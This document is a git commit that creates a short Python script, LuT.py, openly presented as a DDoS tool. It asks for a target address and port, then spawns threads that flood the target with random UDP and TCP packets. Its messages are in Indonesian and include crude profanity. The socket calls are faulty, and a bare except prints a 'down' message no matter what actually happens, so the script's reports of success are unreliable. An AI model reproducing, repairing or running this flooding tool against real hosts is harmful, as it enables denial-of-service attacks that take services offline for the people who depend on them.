09a182c4774a1512d125ff09c64d6288a4d1e727
lutfi133 <93434061+lutfi133@users.noreply.github.com>
2022-01-10 05:11:13 +0000

    Create LuT.py

---
+++ LuT.py
@@ -0,0 +1,53 @@
+import random
+import socket
+import threading
+import os,sys
+import time
+
+print("\033[91")
+print("peringatan ddos adalah kontol memek tunggu 7 detik")
+time.sleep(7)
+os.system("clear")
+print("\033[91m")
+print("""kontol mekek""")
+
+p1 = str(input("p1 :"))
+p2 = int(input("p2 :"))
+p3 = int(input("p3 :"))
+p4 = int(input("p4 :"))
+os.system("clear")
+def ye():
+    yo = random._urandom(1045)
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET , socket.SOCK_DGRAM)
+            s.connect((p1,p2))
+            s.sendto(yo)
+            for x in range(p3):
+                s.sendto(yo)
+            print("gabut to pengen ddos")
+        except:
+            print("yeh down asuh")
+
+def tod():
+    mek = random._urandom(14)
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
+            s.connect((p1,p2))
+            s.sendto(mek)
+            for x in range(p3):
+                s.sendto(mek)
+            print("gabut to pengen ddos")
+        except:
+            s.close()
+            print("yeh down asuh")
+
+
+for y in range(p4):
+    th = threading.Thread(target = ye)
+    th.start()
+else:
+    th = threading.Thread(target = tod)
+    th.start()
+    
